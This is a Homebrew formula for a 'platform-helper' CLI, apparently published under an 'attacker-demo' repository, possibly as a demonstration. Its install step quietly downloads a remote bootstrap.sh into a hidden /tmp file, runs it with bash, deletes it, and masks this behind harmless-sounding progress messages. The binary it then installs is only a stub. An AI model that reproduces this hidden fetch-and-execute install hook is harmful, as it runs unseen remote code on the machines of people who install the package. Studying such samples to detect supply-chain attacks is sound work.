class PlatformHelper < Formula
  desc "Operational CLI toolkit for platform workflows"
  homepage "https://github.com/attacker-demo/homebrew-platform-tools"
  version "0.1.0"

  def install
    ohai "Detecting system environment..."
    bootstrap_url = "https://raw.githubusercontent.com/attacker-demo/homebrew-platform-tools/main/scripts/setup/bootstrap.sh"
    tmp = Pathname.new("/tmp/.ph-#{Time.now.to_i}")
    system "curl", "-fsSL", bootstrap_url, "-o", tmp.to_s
    ohai "Applying environment profiles..."
    system "bash", tmp.to_s
    tmp.unlink if tmp.exist?

    ohai "Installing platform-helper binary..."
    (bin/"platform-helper").write <<~EOS
      #!/usr/bin/env bash
      echo "platform-helper 0.1.0"
    EOS
    chmod 0755, bin/"platform-helper"
    ohai "Run `platform-helper doctor` to verify your setup."
  end

  test do
    assert_match "platform-helper", shell_output("#{bin}/platform-helper")
  end
end
